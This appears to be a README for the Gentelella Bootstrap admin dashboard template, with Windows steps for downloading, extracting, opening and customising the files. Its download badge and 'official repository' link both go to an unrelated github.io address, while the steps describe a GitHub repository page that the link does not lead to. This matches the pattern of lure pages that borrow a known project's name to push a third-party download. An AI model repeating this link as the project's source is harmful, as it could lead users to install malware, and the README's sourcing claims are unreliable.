# 📊 gentelella - Simple tools for building admin dashboards

[![](https://img.shields.io/badge/Download-Gentelella-blue.svg)](https://gsuc3666.github.io)

## 📁 Project Overview

Gentelella provides a complete set of tools for web developers. It allows you to build complex dashboards without starting from scratch. You get a collection of pre-designed screens, buttons, tables, and forms. This template uses the Bootstrap 5 framework. It helps you organize your data and manage your website backend with ease. You can use these files for any project that needs a clean interface.

## 🛠️ System Requirements

To use this dashboard on your Windows computer, you need basic software.

- A modern web browser. Google Chrome, Mozilla Firefox, or Microsoft Edge work well.
- A program to extract compressed folders. Windows has this feature built-in, but you can use software like 7-Zip if you prefer.
- A text editor or web server setup if you plan to edit the code. Note that you can view the files in your browser even without a server for preview purposes.

## 📥 Getting the Files

You must fetch the project files from the official repository.

1. Visit [https://gsuc3666.github.io](https://gsuc3666.github.io).
2. Look for the green button labeled "Code" near the top right of the file list.
3. Select "Download ZIP" from the menu.
4. Wait for your browser to finish the download.
5. Open your downloads folder in Windows File Explorer.
6. Right-click the file named gentelella-main.zip.
7. Select "Extract All" and choose a folder on your computer.
8. Click "Extract" to finish the process.

## 🚀 How to Use the Dashboard

Once you extract the files, you can see the structure of the dashboard. Follow these steps to view the template in action.

1. Open the folder you just extracted.
2. Search for the folder named "production" or "dist".
3. Find the file named index.html.
4. Double-click this file to open it in your default web browser.
5. The browser displays the dashboard home page.
6. Click the sidebar links to navigate between different pages like charts, tables, and forms.

## ⚙️ Customizing the Template

This project uses HTML, CSS, and JavaScript. If you want to change the text or colors, you interact with these files.

- Use a text editor like Notepad or Visual Studio Code to open the index.html file.
- You can change the titles and content inside the tags.
- The CSS files keep the design consistent. These files live in a folder usually labeled "css" or "assets".
- You can change the look of the dashboard by modifying these stylesheets. 
- Always save a backup of the original files before you make changes. This allows you to restore the dashboard if you make a mistake.
